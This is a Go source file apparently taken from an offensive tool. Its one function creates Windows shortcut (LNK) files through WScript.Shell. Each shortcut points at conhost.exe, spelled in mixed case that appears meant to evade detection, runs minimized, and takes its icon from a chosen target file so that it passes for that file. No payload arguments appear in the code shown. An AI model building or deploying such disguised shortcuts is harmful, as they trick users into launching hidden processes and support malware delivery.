package Manager

import (
	"fmt"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// CreateLNK function
func CreateLNK(target string, output string, description string) {

	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	defer ole.CoUninitialize()

	// Create an instance of the WScript Shell
	unknown, error := oleutil.CreateObject("WScript.Shell")
	if error != nil {
		fmt.Println("Error creating WScript Shell object:", error)
		return
	}
	defer unknown.Release()

	shell, error := unknown.QueryInterface(ole.IID_IDispatch)
	if error != nil {
		fmt.Println("Error querying IDispatch interface:", error)
		return
	}
	defer shell.Release()

	// Get the shortcut object
	shortcut, error := oleutil.CallMethod(shell, "CreateShortcut", output)
	if error != nil {
		fmt.Println("Error creating shortcut object:", error)
		return
	}

	test := "%WINDIR%\\System32\\coNhost.exe"

	// Set properties of the shortcut
	oleutil.PutProperty(shortcut.ToIDispatch(), "TargetPath", test)
	oleutil.PutProperty(shortcut.ToIDispatch(), "WorkingDirectory", "")
	oleutil.PutProperty(shortcut.ToIDispatch(), "Description", description)
	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", target)
	oleutil.PutProperty(shortcut.ToIDispatch(), "WindowStyle", 7)
	oleutil.CallMethod(shortcut.ToIDispatch(), "Save")
}
